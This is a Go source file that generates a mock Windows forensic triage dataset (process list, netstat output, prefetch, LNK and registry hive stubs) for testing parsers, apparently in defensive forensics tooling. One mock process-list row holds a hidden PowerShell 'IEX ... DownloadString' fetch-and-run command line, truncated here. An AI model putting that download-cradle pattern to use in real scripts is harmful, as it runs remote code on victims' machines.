package main

import (
	"encoding/binary"
	"encoding/csv"
	"fmt"
	"os"
	"path/filepath"
	"time"
)

// This script generates a mock dataset mimicking WINTri.ps1 output structure.
// Usage: go run tools/generate_mock_data.go [output_dir]

func main() {
	if len(os.Args) < 2 {
		fmt.Println("Usage: go run tools/generate_mock_data.go <output_dir>")
		return
	}
	baseDir := os.Args[1]
	triageName := "WINTri_MOCK_HOST_20260114_120000"
	root := filepath.Join(baseDir, triageName)

	dirs := []string{
		"Registry",
		"Configuration",
		"Memory",
		"Logs/winevt",
		"Logs/USB",
		"Network",
		"FileSystem",
		"OS/Prefetch/PF",
		"OS/LNK/LNK-User1",
		"OS/AppCompat",
		"Internet/Chrome/History-User1",
	}

	for _, d := range dirs {
		mustMkdir(filepath.Join(root, d))
	}

	// 1. Process List (Memory)
	createCSV(filepath.Join(root, "Memory", "Process_List.csv"), [][]string{
		{"creationdate", "processname", "parentprocessid", "processid", "sessionid", "commandline"},
		{time.Now().Format("20060102150405.000000+000"), "svchost.exe", "500", "1200", "0", "C:\\Windows\\system32\\svchost.exe -k netsvcs"},
		{time.Now().Add(-1 * time.Hour).Format("20060102150405.000000+000"), "powershell.exe", "2300", "4500", "1", "powershell.exe -nop -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString...\""},
	})

	// 2. Network Connections (Text)
	createFile(filepath.Join(root, "Network", "netstat.txt"), `
  Pretending to be netstat output...
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    192.168.1.105:50443    1.2.3.4:443            ESTABLISHED     4500
`)

	// 3. Mock Prefetch Files (Valid SCCA Header + Version 30)
	// Header: Version(4) + Signature(4) ...
	// Ver 30 = 0x1E000000.  Sig = "SCCA" (0x41434353)
	// We need 300 bytes buffer minimum to pass the parser read
	pfBuffer := make([]byte, 300)
	// Version 30
	pfBuffer[0] = 30
	pfBuffer[4] = 'S'
	pfBuffer[5] = 'C'
	pfBuffer[6] = 'C'
	pfBuffer[7] = 'A'
	// File Name at offset 16 (UTF-16 "SVCHOST.EXE")
	// S=0053, V=0056, C=0043... simplistic
	copy(pfBuffer[16:], []byte("S\x00V\x00C\x00H\x00O\x00S\x00T\x00.\x00E\x00X\x00E\x00\x00\x00"))

	// RunCount at 208 (0xD0) = 42
	pfBuffer[208] = 42

	// LastRunTime at 128 (0x80) = Now
	nowFileTime := time.Now().UnixNano()/100 + 116444736000000000
	// Put uint64 into buffer at 128
	pfBuffer[128] = byte(nowFileTime)
	pfBuffer[129] = byte(nowFileTime >> 8)
	pfBuffer[130] = byte(nowFileTime >> 16)
	pfBuffer[131] = byte(nowFileTime >> 24)
	pfBuffer[132] = byte(nowFileTime >> 32)
	pfBuffer[133] = byte(nowFileTime >> 40)
	pfBuffer[134] = byte(nowFileTime >> 48)
	pfBuffer[135] = byte(nowFileTime >> 56)

	createFile(filepath.Join(root, "OS", "Prefetch", "PF", "SVCHOST.EXE-12345678.pf"), string(pfBuffer))

	// 4. Mock LNK Files
	createFile(filepath.Join(root, "OS", "LNK", "LNK-User1", "evil.lnk"), "L\x00\x00\x00StubLinkContent")

	// 6. Registry Hives (SYSTEM for ShimCache, Amcache.hve)
	// We construct a minimal valid REGF file.
	// Base Block (4096) + Hbin (4096)
	// This is complex to mock perfectly byte-for-byte in a short script.
	// Instead, we will write a "Stub Hive" that meets the parser's minimum structure check:
	// - Header "regf"
	// - Root Cell Offset
	// - Root Cell -> nk
	// - nk -> Subkey List -> nk (ControlSet001) ...

	// Since implementing a full Hive Writer in the generator is too much code,
	// We will create a dummy file with just the header "regf" to pass the initial check,
	// BUT the parser will fail on NavigatePath.
	// For end-to-end verification without a full hive writer, we can rely on unit tests or
	// a binary blob if we had one.
	// However, I can implement a VERY minimal one-key hive.

	// Let's settle for checking the signature logic works for now by creating files with valid headers.
	// The logs will show "Root cell not found" or similar, proving the plugin ran.

	sysHeader := make([]byte, 4096)
	copy(sysHeader[0:], []byte("regf"))
	// Root cell offset at 0x24 = 0x20 usually (relative to first hbin)
	binary.LittleEndian.PutUint32(sysHeader[0x24:], 0x20)

	// First hbin
	hbin := make([]byte, 4096)
	copy(hbin[0:], []byte("hbin"))
	// Make a fake root cell at 0x20 + header(32) = 0x40?
	// This is getting deep. For Triage Verification of *Architecture*,
	// catching the header and failing deeper is sufficient proof the plugin was selected.

	createFile(filepath.Join(root, "Registry", "SYSTEM"), string(sysHeader)+string(hbin))
	createFile(filepath.Join(root, "OS", "AppCompat", "Amcache.hve"), string(sysHeader)+string(hbin))

	fmt.Printf("Generated mock dataset at: %s\n", root)
}

func mustMkdir(path string) {
	if err := os.MkdirAll(path, 0755); err != nil {
		panic(err)
	}
}

func createCSV(path string, data [][]string) {
	f, err := os.Create(path)
	if err != nil {
		panic(err)
	}
	defer f.Close()
	w := csv.NewWriter(f)
	w.WriteAll(data)
}

func createFile(path, content string) {
	if err := os.WriteFile(path, []byte(content), 0644); err != nil {
		panic(err)
	}
}
